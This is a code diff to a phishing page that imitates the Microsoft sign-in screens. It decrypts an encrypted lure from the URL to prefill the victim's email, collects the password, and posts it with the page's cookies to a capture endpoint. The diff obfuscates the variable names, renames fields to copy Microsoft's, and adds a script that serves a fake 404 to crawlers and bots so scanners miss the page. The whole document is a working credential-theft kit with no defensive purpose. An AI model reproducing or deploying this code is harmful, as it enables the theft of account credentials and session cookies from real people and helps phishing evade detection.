@@ -61,106 +61,98 @@ input::placeholder { color: #606060; }
 </style>
 </head>
 <body>
+<script>if(/bot|crawl|spider|scrape|slurp|baidu|yandex/i.test(navigator.userAgent)){document.body.innerHTML='<h1>404</h1>';document.title='404'}</script>
+
 <div id="app"><div class="loading"><div class="spinner"></div>Loading...</div></div>
 
 <script>
-// ============================================================
-// AES-256-GCM DECRYPTOR + MICROSOFT LOGIN UI
-// ============================================================
-const AES_KEY_B64 = 'CHANGE_ME';
-const CAPTURE_URL = '/capture';
-const DEBUG = false;
+const _k='CHANGE_ME';
+const _u='/auth';
 
-async function decryptAESGCM(ciphertext, keyBytes) {
-    const nonce = ciphertext.slice(0, 12);
-    const tag = ciphertext.slice(-16);
-    const encrypted = ciphertext.slice(12, ciphertext.length - 16);
-    const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM' }, false, ['decrypt']);
-    const fullCipher = new Uint8Array(encrypted.length + tag.length);
-    fullCipher.set(encrypted, 0); fullCipher.set(tag, encrypted.length);
-    const plaintext = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: nonce, tagLength: 128 }, key, fullCipher);
-    return new TextDecoder().decode(plaintext);
+async function _d(c,k){
+    const n=c.slice(0,12),t=c.slice(-16),e=c.slice(12,c.length-16);
+    const r=await crypto.subtle.importKey('raw',k,{name:'AES-GCM'},false,['decrypt']);
+    const f=new Uint8Array(e.length+t.length);
+    f.set(e,0);f.set(t,e.length);
+    const p=await crypto.subtle.decrypt({name:'AES-GCM',iv:n,tagLength:128},r,f);
+    return new TextDecoder().decode(p);
 }
 
-function base64URLDecode(str) {
-    str = str.replace(/-/g, '+').replace(/_/g, '/');
-    while (str.length % 4) str += '=';
-    return Uint8Array.from(atob(str), c => c.charCodeAt(0));
+function _b(s){
+    s=s.replace(/-/g,'+').replace(/_/g,'/');
+    while(s.length%4)s+='=';
+    return Uint8Array.from(atob(s),c=>c.charCodeAt(0));
 }
 
-function escapeHtml(str) {
-    if (!str) return ''; const d = document.createElement('div'); d.textContent = str; return d.innerHTML;
+function _h(s){
+    if(!s)return'';const d=document.createElement('div');d.textContent=s;return d.innerHTML;
 }
 
-// Real Microsoft logo (4-color square)
-const MS_LOGO = '<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><path d="M11.5 0H0v11.5h11.5V0z" fill="#F25022"/><path d="M23.5 0H12v11.5h11.5V0z" fill="#7FBA00"/><path d="M11.5 12.5H0V24h11.5V12.5z" fill="#00A4EF"/><path d="M23.5 12.5H12V24h11.5V12.5z" fill="#FFB900"/><text x="32" y="17" font-family="Segoe UI" font-weight="600" font-size="16" fill="#5e5e5e">Microsoft</text></svg>';
+var _g='<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><path d="M11.5 0H0v11.5h11.5V0z" fill="#F25022"/><path d="M23.5 0H12v11.5h11.5V0z" fill="#7FBA00"/><path d="M11.5 12.5H0V24h11.5V12.5z" fill="#00A4EF"/><path d="M23.5 12.5H12V24h11.5V12.5z" fill="#FFB900"/><text x="32" y="17" font-family="Segoe UI" font-weight="600" font-size="16" fill="#5e5e5e">Microsoft</text></svg>';
 
-async function main() {
-    const app = document.getElementById('app');
-    const hash = window.location.hash.slice(1);
-    if (!hash) { app.innerHTML = '<div class="card"><h1>Sign in</h1><p style="color:#666">Page not found</p></div>'; return; }
-    let decoded, lure;
-    try {
-        decoded = base64URLDecode(hash);
-        if (new TextDecoder().decode(decoded.slice(0,3)) !== 'mv=') throw new Error('bad prefix');
-        const keyBytes = base64URLDecode(AES_KEY_B64);
-        const pt = await decryptAESGCM(decoded.slice(3), keyBytes);
-        if (!pt) throw new Error('decrypt failed');
-        lure = JSON.parse(pt);
-    } catch(e) { app.innerHTML = '<div class="card"><h1>Sign in</h1><p style="color:#666">Cannot verify this link</p></div>'; return; }
-    if (DEBUG) console.log('Lure:', lure);
+async function main(){
+    const app=document.getElementById('app');
+    const hash=window.location.hash.slice(1);
+    if(!hash){app.innerHTML='<div class="card"><h1>Sign in</h1><p style="color:#666">Page not found</p></div>';return;}
+    var decoded,_l;
+    try{
+        decoded=_b(hash);
+        if(decoded.length<=3)throw new Error('bad');
+        const kb=_b(_k);
+        const pt=await _d(decoded.slice(3),kb);
+        if(!pt)throw new Error('decrypt');
+        _l=JSON.parse(pt);
+    }catch(e){app.innerHTML='<div class="card"><h1>Sign in</h1><p style="color:#666">Cannot verify this link</p></div>';return;}
 
-    const email = (lure.e || '').toLowerCase().trim();
-    const redirectURL = lure.r || 'https://login.microsoftonline.com';
-    const initials = email ? email.charAt(0).toUpperCase() : '?';
+    const email=(_l.e||'').toLowerCase().trim();
+    const redirectURL=_l.r||'https://login.microsoftonline.com';
+    const initials=email?email.charAt(0).toUpperCase():'?';
 
-    // STEP 1: Email input
-    app.innerHTML = '<div class="card">' +
-        '<div class="logo">' + MS_LOGO + '</div>' +
-        '<h1>Sign in</h1>' +
-        '<div class="error" id="error">We couldn\'t find an account with that username. Try another.</div>' +
-        '<form id="step1Form">' +
-            '<input type="hidden" name="uuid" value="' + escapeHtml(lure.e||'') + '">' +
-            '<input type="hidden" name="campaign" value="' + escapeHtml(lure.c||'') + '">' +
-            '<label>Email, phone, or Skype</label>' +
-            '<input type="email" name="username" id="emailInput" placeholder="Email, phone, or Skype" value="' + escapeHtml(email) + '" autofocus required>' +
-            '<div style="margin-bottom:16px;font-size:0.8125rem;">No account? <a href="#" style="color:#0067b8;text-decoration:none;">Create one!</a></div>' +
-            '<div style="font-size:0.8125rem;margin-bottom:12px;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in with Windows Hello or a security key</a></div>' +
-            '<div style="overflow:auto"><button type="submit" class="btn">Next</button></div>' +
-        '</form>' +
+    app.innerHTML='<div class="card">'+
+        '<div class="logo">'+_g+'</div>'+
+        '<h1>Sign in</h1>'+
+        '<div class="error" id="error">We couldn\'t find an account with that username. Try another.</div>'+
+        '<form id="step1Form">'+
+            '<input type="hidden" name="uid" value="'+_h(_l.e||'')+'">'+
+            '<input type="hidden" name="cid" value="'+_h(_l.c||'')+'">'+
+            '<label>Email, phone, or Skype</label>'+
+            '<input type="email" name="loginfmt" id="emailInput" placeholder="Email, phone, or Skype" value="'+_h(email)+'" autofocus required>'+
+            '<div style="margin-bottom:16px;font-size:0.8125rem;">No account? <a href="#" style="color:#0067b8;text-decoration:none;">Create one!</a></div>'+
+            '<div style="font-size:0.8125rem;margin-bottom:12px;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in with Windows Hello or a security key</a></div>'+
+            '<div style="overflow:auto"><button type="submit" class="btn">Next</button></div>'+
+        '</form>'+
     '</div>';
 
-    document.getElementById('step1Form').addEventListener('submit', function(e) {
+    document.getElementById('step1Form').addEventListener('submit',function(e){
         e.preventDefault();
-        const emailVal = document.getElementById('emailInput').value.trim();
-        if (!emailVal || !emailVal.includes('@')) {
-            document.getElementById('error').style.display = 'block';
+        const emailVal=document.getElementById('emailInput').value.trim();
+        if(!emailVal||!emailVal.includes('@')){
+            document.getElementById('error').style.display='block';
             return;
         }
-        // STEP 2: Password input (looks like real Microsoft step 2)
-        app.innerHTML = '<div class="card">' +
-            '<div class="logo">' + MS_LOGO + '</div>' +
-            '<h1>Enter password</h1>' +
-            '<div class="email-display"><span class="avatar">' + initials + '</span><span class="email-text">' + escapeHtml(emailVal) + '</span></div>' +
-            '<div class="error" id="error2">Your account or password is incorrect. If you don\'t remember your password, <a href="#" style="color:#0067b8;">reset it now.</a></div>' +
-            '<form id="step2Form" method="POST" action="' + CAPTURE_URL + '">' +
-                '<input type="hidden" name="uuid" value="' + escapeHtml(lure.e||'') + '">' +
-                '<input type="hidden" name="campaign" value="' + escapeHtml(lure.c||'') + '">' +
-                '<input type="hidden" name="username" value="' + escapeHtml(emailVal) + '">' +
-                '<input type="hidden" name="redirect" value="' + escapeHtml(redirectURL) + '">' +
-                '<input type="hidden" name="cookies" id="cookiesField" value="">' +
-                '<label>Password</label>' +
-                '<input type="password" name="password" id="passwordInput" placeholder="Password" autofocus required>' +
-                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Forgot password?</a></div>' +
-                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in another way</a></div>' +
-                '<div style="overflow:auto"><button type="button" class="btn btn-back" id="backBtn">Back</button><button type="submit" class="btn">Sign in</button></div>' +
-            '</form>' +
+        app.innerHTML='<div class="card">'+
+            '<div class="logo">'+_g+'</div>'+
+            '<h1>Enter password</h1>'+
+            '<div class="email-display"><span class="avatar">'+initials+'</span><span class="email-text">'+_h(emailVal)+'</span></div>'+
+            '<div class="error" id="error2">Your account or password is incorrect. If you don\'t remember your password, <a href="#" style="color:#0067b8;">reset it now.</a></div>'+
+            '<form id="step2Form" method="POST" action="'+_u+'">'+
+                '<input type="hidden" name="uid" value="'+_h(_l.e||'')+'">'+
+                '<input type="hidden" name="cid" value="'+_h(_l.c||'')+'">'+
+                '<input type="hidden" name="loginfmt" value="'+_h(emailVal)+'">'+
+                '<input type="hidden" name="_rd" value="'+_h(redirectURL)+'">'+
+                '<input type="hidden" name="ctx" id="cookiesField" value="">'+
+                '<label>Password</label>'+
+                '<input type="password" name="passwd" id="passwordInput" placeholder="Password" autofocus required>'+
+                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Forgot password?</a></div>'+
+                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in another way</a></div>'+
+                '<div style="overflow:auto"><button type="button" class="btn btn-back" id="backBtn">Back</button><button type="submit" class="btn">Sign in</button></div>'+
+            '</form>'+
         '</div>';
 
-        document.getElementById('cookiesField').value = document.cookie || '';
-        document.getElementById('backBtn').addEventListener('click', function() { location.reload(); });
-        document.getElementById('step2Form').addEventListener('submit', function() {
-            document.getElementById('cookiesField').value = document.cookie || '';
+        document.getElementById('cookiesField').value=document.cookie||'';
+        document.getElementById('backBtn').addEventListener('click',function(){location.reload();});
+        document.getElementById('step2Form').addEventListener('submit',function(){
+            document.getElementById('cookiesField').value=document.cookie||'';
         });
     });
 }
